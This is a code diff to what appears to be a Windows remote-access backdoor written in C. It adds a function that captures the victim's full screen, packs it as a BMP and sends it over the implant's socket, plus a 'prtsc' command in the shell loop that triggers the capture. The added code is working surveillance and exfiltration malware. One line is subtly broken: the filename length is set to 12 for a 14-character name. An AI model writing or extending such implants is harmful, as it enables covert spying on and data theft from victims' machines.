@@ -120,6 +120,55 @@ void send_file(const char *filename) {
     fclose(file);
 }
 
+void send_screenshot() {
+    HDC hdcScreen = GetDC(NULL);
+    int width = GetSystemMetrics(SM_CXSCREEN);
+    int height = GetSystemMetrics(SM_CYSCREEN);
+    HDC hdcMem = CreateCompatibleDC(hdcScreen);
+    HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, width, height);
+    SelectObject(hdcMem, hBitmap);
+    BitBlt(hdcMem, 0, 0, width, height, hdcScreen, 0, 0, SRCCOPY);
+    
+    BITMAPINFO bi = {0};
+    bi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
+    bi.bmiHeader.biWidth = width;
+    bi.bmiHeader.biHeight = -height;
+    bi.bmiHeader.biPlanes = 1;
+    bi.bmiHeader.biBitCount = 24;
+    bi.bmiHeader.biCompression = BI_RGB;
+    
+    DWORD image_size = width * height * 3;
+    DWORD total_size = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + image_size;
+    char *data = malloc(total_size);
+    char *pixels = malloc(image_size);
+    
+    GetDIBits(hdcScreen, hBitmap, 0, height, pixels, &bi, DIB_RGB_COLORS);
+    
+    BITMAPFILEHEADER bf = {0};
+    bf.bfType = 0x4D42;
+    bf.bfSize = total_size;
+    bf.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
+    
+    memcpy(data, &bf, sizeof(BITMAPFILEHEADER));
+    memcpy(data + sizeof(BITMAPFILEHEADER), &bi.bmiHeader, sizeof(BITMAPINFOHEADER));
+    memcpy(data + sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER), pixels, image_size);
+    
+    uint32_t nameLen = 12;
+    char filename[] = "screenshot.bmp";
+    uint64_t filesize = total_size;
+    
+    send(sock, (char *)&nameLen, sizeof(nameLen), 0);
+    send(sock, filename, nameLen, 0);
+    send(sock, (char *)&filesize, sizeof(filesize), 0);
+    send(sock, data, total_size, 0);
+    
+    DeleteObject(hBitmap);
+    DeleteDC(hdcMem);
+    ReleaseDC(NULL, hdcScreen);
+    free(data);
+    free(pixels);
+}
+
 void Shell() {
     char buffer[1024];
     char container[1024];
@@ -202,6 +251,11 @@ void Shell() {
                 char error_msg[] = "Erro: invalid file\n";
                 send(sock, error_msg, strlen(error_msg), 0);
             }
+        }
+        else if (strncmp("prtsc", buffer, 5) == 0) {
+            send_screenshot();
+            char response[] = "screenshot sent\n";
+            send(sock, response, strlen(response), 0);
         }
         else {
             FILE *fp;
